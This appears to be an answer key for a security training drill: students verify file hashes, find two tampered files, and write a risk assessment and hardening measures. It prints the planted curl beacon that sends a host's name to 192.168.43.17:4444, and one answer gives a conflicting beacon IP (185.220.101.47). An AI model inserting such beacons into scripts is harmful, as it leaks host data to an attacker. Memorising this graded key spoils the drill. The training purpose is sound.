# Solution: Drill 02 (Basic) — Hash File Verification Challenge

---

## Task 1: Verification Results

Running `sha256sum --check SHA256SUMS.published` produces:

```text
soc_agent_v2.3.sh: FAILED
threat_intel_updater.py: OK
firewall_rules.conf: FAILED
ids_config.yaml: OK
certificate_bundle.pem: OK
sha256sum: WARNING: 2 computed checksums did NOT match
```

**Files that passed:** `threat_intel_updater.py`, `ids_config.yaml`, `certificate_bundle.pem`

**Files that failed:** `soc_agent_v2.3.sh`, `firewall_rules.conf`

---

## Task 2: What Changed

### soc_agent_v2.3.sh — TAMPERED

The following line was appended to the end of the file:

```console
# Telemetry
curl -s http://192.168.43.17:4444/beacon?host=$(hostname) &
```

**Detection:**

```console
# The hash mismatch tells you something changed
sha256sum soc_agent_v2.3.sh
# → hash differs from SHA256SUMS.published

# Read the file and look at the end
tail -5 soc_agent_v2.3.sh
```

### firewall_rules.conf — TAMPERED

The SSH rule was changed from:

```text
-A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
```

To:

```text
-A INPUT -p tcp --dport 22 -j ACCEPT
```

The source IP restriction (`-s 10.0.0.0/8`) was removed, allowing SSH from **any IP address** instead of only the internal network.

---

## Task 3: Risk Assessment

### File 1: soc_agent_v2.3.sh

| | Details |
|--|---------|
| **What changed** | Malicious beacon command added at end of file |
| **What it does** | On every execution, sends hostname to attacker's C2 server (192.168.43.17:4444) |
| **Security impact** | CRITICAL — active backdoor/C2 beacon; all machines running this agent are compromised |
| **Attacker goal** | Asset inventory; potential staging for further exploitation |
| **IOC** | IP 192.168.43.17:4444 |

**Immediate actions:**

1. Isolate all systems where this agent was deployed
1. Block 192.168.43.17 at perimeter firewall
1. Search SIEM/proxy logs for connections to 192.168.43.17
1. Determine when the modified file was first deployed (check software distribution logs)
1. Preserve forensic evidence before remediation

### File 2: firewall_rules.conf

| | Details |
|--|---------|
| **What changed** | SSH access restriction removed (was internal-only, now any source IP) |
| **Security impact** | HIGH — SSH exposed to the internet on all hosts using this config |
| **Attacker goal** | Enable remote SSH access for persistence or future exploitation |
| **Compounding risk** | If any host has weak SSH credentials, internet-facing brute force is now possible |

**Immediate actions:**

1. Audit all hosts that applied this firewall config
1. Restore original rule with `-s 10.0.0.0/8` restriction
1. Check SSH logs for unauthorized login attempts from external IPs
1. Rotate SSH keys as precaution
1. Check for any successful external SSH logins

---

## Task 4: Hardening Questions

### Q1: Checksum file on same server — problem and fix

**Problem:** If an attacker can modify the software files, they can also modify the SHA256SUMS file to match their tampered versions.
The integrity of the verification depends entirely on the integrity of the SHA256SUMS file.

**Fix:**

1. Publish checksums on a **separate, read-only server** or out-of-band channel
1. **GPG-sign** the SHA256SUMS file with the vendor's private key
1. Host checksums on a **different trust boundary** (different server, different domain)
1. Use a **content-addressed storage** system (e.g., package managers with signed repos)

### Q2: Purpose of GPG-signing the checksum file

GPG signing prevents an attacker from creating a fake SHA256SUMS file that "validates" their tampered software.
The GPG signature:

* Proves the checksum file came from the legitimate vendor (private key holder)
* Makes it computationally infeasible to forge a valid signature without the vendor's private key
* Allows offline verification without trusting the file server

```console
# Verifying a GPG-signed checksum file:
gpg --verify SHA256SUMS.sig SHA256SUMS.published
sha256sum --check SHA256SUMS.published
```

### Q3: How code signing would prevent this

Windows Authenticode / macOS code signing / GPG for Linux packages would:

* Embed a digital signature directly in the binary/script (or as a detached signature)
* The signature is computed from the **entire file content** using the vendor's private key
* Operating system/package manager verifies signature **before execution or installation**
* An attacker who modifies the file invalidates the signature
* The modified `soc_agent_v2.3.sh` would fail signature verification and not execute

**Limitation:** Code signing only prevents unsigned code from running if enforcement is mandatory.
If scripts don't have mandatory signature verification, an attacker can still run them.

### Q4: Additional monitoring controls

1. **File Integrity Monitoring (FIM):** Tools like AIDE, Tripwire, or EDR FIM features continuously monitor critical files for changes; alert on any modification
1. **Software deployment logs:** Log every file distribution event with hash; alert on hash changes
1. **Network monitoring:** Detect new outbound connections to external IPs (185.220.101.47 beacon)
1. **Endpoint Detection:** EDR agent detects curl/wget calls spawned from security software processes
1. **Configuration management:** Tools like Ansible/Puppet can detect configuration drift and alert
1. **Code repository integrity:** Store configs in Git with commit signing; deploy only from verified commits

---

## Scoring

| Task | Points | Criteria |
|------|--------|---------|
| Task 1 | 2 | Correctly identifying both tampered files |
| Task 2 | 2 | Correctly describing what changed in each file |
| Task 3 | 4 | Risk assessment (2 pts each file): impact + actions |
| Task 4 | 4 | Hardening (1 pt per question) |
| **Total** | **12** | |

**Pass:** 9/12 with valid reasoning
